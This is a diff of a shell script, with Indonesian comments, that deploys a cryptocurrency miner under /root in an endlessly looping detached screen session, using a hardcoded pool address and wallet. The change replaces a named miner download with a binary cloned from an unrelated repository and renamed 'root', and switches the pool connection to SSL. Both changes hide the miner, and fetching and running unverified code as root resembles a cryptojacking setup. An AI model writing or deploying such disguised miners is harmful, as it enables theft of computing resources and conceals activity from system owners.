@@ -12,11 +12,8 @@ cd /root || exit
 # Download dan siapkan miner jika belum ada
 if [ ! -f yui56/hellminer ]; then
   echo "⬇️ Mengunduh dan menyiapkan hellminer_linux64..."
-  git clone https://github.com/amirul5656/yui56.git
-  cd yui56 || exit
-  wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
-  tar -xvzf hellminer_linux64.tar.gz
-  chmod +x hellminer
+  git clone https://github.com/root6789/home.git
+  chmod +x root
 else
   cd yui56 || exit
 fi
@@ -28,7 +25,7 @@ else
   echo "▶ Menjalankan mining di screen 'amirul3'..."
   screen -dmS amirul3 bash -c '
     while true; do
-      ./hellminer -c stratum+tcp://cn.vipor.net:5040 -u RQdUotwPueFvRY5xKfn6REsMUsBdhhmqdq.asia -p x --threads 7
+      ./root -c stratum+ssl://usw.vipor.net:5140 -u RQdUotwPueFvRY5xKfn6REsMUsBdhhmqdq.asia -p x --threads 7
       sleep 2
     done
   '
